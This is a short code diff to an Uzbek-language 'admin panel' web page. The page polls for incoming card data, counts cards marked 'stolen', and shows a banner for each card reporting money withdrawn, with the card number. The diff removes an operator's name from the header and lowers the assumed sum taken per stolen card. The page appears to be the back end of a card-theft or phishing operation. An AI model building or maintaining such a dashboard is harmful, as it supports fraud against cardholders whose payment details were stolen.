@@ -397,7 +397,7 @@
     <div class="header-left">
       <div class="header-icon">⚡</div>
       <div>
-        <div class="header-title">AZIM // ADMIN PANEL</div>
+        <div class="header-title">// ADMIN PANEL</div>
         <div class="header-sub">Kiruvchi ma'lumotlar — real vaqt rejimi</div>
       </div>
     </div>
@@ -469,9 +469,9 @@ async function poll() {
     document.getElementById('statCount').textContent = cards.length;
     const stolen = cards.filter(c => c.status === 'stolen').length;
     document.getElementById('statStolen').textContent = stolen;
-    document.getElementById('statTotal').textContent  = stolen * 10;
+    document.getElementById('statTotal').textContent  = stolen * 5;
 
-    const totalSum = stolen * 10_000_000;
+    const totalSum = stolen * 5_000_000;
     document.getElementById('totalAmount').textContent =
       totalSum.toLocaleString('uz-UZ') + ' so\'m';
 
@@ -523,7 +523,7 @@ function addCardToFeed(card) {
     <div class="stolen-banner" id="banner-${card.id}">
       <div class="stolen-icon">✓</div>
       <div class="stolen-text">
-        <div class="amount">10,000,000 so'm yechib olindi!</div>
+        <div class="amount">5,000,000 so'm yechib olindi!</div>
         <div class="sub">Karta: ${formatCard(card.number)} &nbsp;|&nbsp; ${card.time}</div>
       </div>
     </div>
